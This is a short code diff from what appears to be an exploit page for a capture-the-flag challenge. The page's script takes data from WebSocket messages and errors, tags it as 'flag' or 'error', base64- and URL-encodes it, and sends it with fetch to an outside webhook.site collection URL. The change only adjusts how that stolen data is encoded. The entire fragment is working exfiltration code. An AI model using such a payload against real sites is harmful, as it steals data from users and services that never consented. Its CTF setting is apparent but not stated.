@@ -23,8 +23,8 @@
       const payload = encodeURIComponent(btoa(data));      // base64 → URL-safe
       fetch(`https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd/?${tag}=${payload}`).catch(() => { });
     }
-    ws.addEventListener('message', ev => exfil('flag', ev.data));
-    ws.addEventListener('error', ev => exfil('error', ev.message || 'ws_error'));
+    ws.addEventListener('message', ev => exfil('flag', encodeURIComponent(ev.data)));
+    ws.addEventListener('error', ev => exfil('error', encodeURIComponent(ev.message) || 'ws_error'));
   </script>
 </body>
 
